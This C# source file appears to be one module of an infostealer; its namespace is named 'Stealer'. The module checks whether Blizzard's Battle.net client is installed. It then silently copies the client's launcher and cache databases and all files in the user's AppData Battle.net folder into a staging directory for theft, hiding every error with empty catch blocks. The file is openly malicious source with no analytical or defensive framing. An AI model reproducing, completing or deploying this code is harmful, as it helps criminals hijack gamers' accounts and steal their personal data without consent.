using System;
using System.IO;

namespace Stealer;

internal class BattleNet
{
	private static bool in_patch;

	public static int count;

	public static void get()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
			if (Directory.Exists(folderPath + "\\Battle.net") && Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Battle.net"))
			{
				Directory.CreateDirectory(Help.path_stealer + "BattleNet\\");
				CopyFile(folderPath + "\\Battle.net\\.product.db", Help.path_stealer + "BattleNet");
				CopyFile(folderPath + "\\Battle.net\\Launcher.db", Help.path_stealer + "BattleNet");
				string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Battle.net");
				foreach (string obj in files)
				{
					string destFileName = string.Concat(str2: Path.GetFileName(obj), str0: Help.path_stealer, str1: "BattleNet\\");
					File.Copy(obj, destFileName);
				}
				count++;
				CopyFile(folderPath + "\\Battle.net\\Cachedata.db", Help.path_stealer + "BattleNet");
			}
		}
		catch
		{
		}
	}

	private static void CopyFile(string s1, string toDir)
	{
		try
		{
			string fileName = Path.GetFileName(s1);
			if (!in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
			{
				string destFileName = toDir + "\\" + fileName;
				File.Copy(s1, destFileName);
			}
		}
		catch (Exception)
		{
		}
	}
}
